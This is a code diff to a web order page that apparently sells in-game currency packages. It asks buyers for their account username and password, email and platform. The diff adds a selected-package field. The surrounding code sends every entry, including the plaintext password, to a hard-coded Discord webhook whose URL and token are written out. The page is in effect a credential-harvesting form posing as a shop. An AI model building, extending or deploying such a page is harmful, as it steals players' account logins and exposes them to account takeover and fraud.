@@ -30,9 +30,9 @@
     <input type="password" id="password" placeholder="Password" required>
 
     <h2>Select Package</h2>
-    <button type="button" onclick="selectPackage(4.25)">50M Bank - £4.25</button>
-    <button type="button" onclick="selectPackage(7.50)">100M Bank - £7.50</button>
-    <button type="button" onclick="selectPackage(14.99)">500M Bank - £14.99</button>
+    <button type="button" onclick="selectPackage(4.25, '50M Bank')">50M Bank - £4.25</button>
+    <button type="button" onclick="selectPackage(7.50, '100M Bank')">100M Bank - £7.50</button>
+    <button type="button" onclick="selectPackage(14.99, '500M Bank')">500M Bank - £14.99</button>
 
     <h2>Email Address</h2>
     <input type="email" id="email" placeholder="Enter your email" required>
@@ -49,11 +49,13 @@
 
   <script>
     let price = 0;
+    let selectedPackage = '';
 
-    // Update the price based on the package selected
-    function selectPackage(packagePrice) {
+    // Update the price and selected package based on the package button clicked
+    function selectPackage(packagePrice, packageName) {
       price = packagePrice;
-      document.getElementById('confirmationMessage').innerText = `Price: £${price}`;
+      selectedPackage = packageName;
+      document.getElementById('confirmationMessage').innerText = `Selected Package: ${selectedPackage} - £${price}`;
     }
 
     // Process the payment and confirm the order
@@ -64,7 +66,7 @@
       const platform = document.getElementById('platformSelect').value;
       const paymentCheck = document.getElementById('paymentCheck').checked;
 
-      if (!username || !password || !email || !paymentCheck || price === 0) {
+      if (!username || !password || !email || !paymentCheck || price === 0 || !selectedPackage) {
         alert('Please fill in all fields and confirm payment.');
         return;
       }
@@ -74,7 +76,8 @@
         password: password,
         email: email,
         platform: platform,
-        price: price
+        price: price,
+        selectedPackage: selectedPackage
       };
 
       // Send the data to the Discord webhook
@@ -86,7 +89,7 @@
       const webhookUrl = 'https://discord.com/api/webhooks/1315868877200298056/neYt5Dh8BC9zrQf6SWWjs-yV44mm3JliAc7hb-mxJkIkOVUi-IgIbSArxSEKjFo7RZya';
 
       const payload = {
-        content: `New Order: \nUsername: ${orderDetails.username} \nPassword: ${orderDetails.password} \nEmail: ${orderDetails.email} \nPlatform: ${orderDetails.platform} \nPrice: £${orderDetails.price}`
+        content: `New Order: \nUsername: ${orderDetails.username} \nPassword: ${orderDetails.password} \nEmail: ${orderDetails.email} \nPlatform: ${orderDetails.platform} \nPackage: ${orderDetails.selectedPackage} \nPrice: £${orderDetails.price}`
       };
 
       fetch(webhookUrl, {
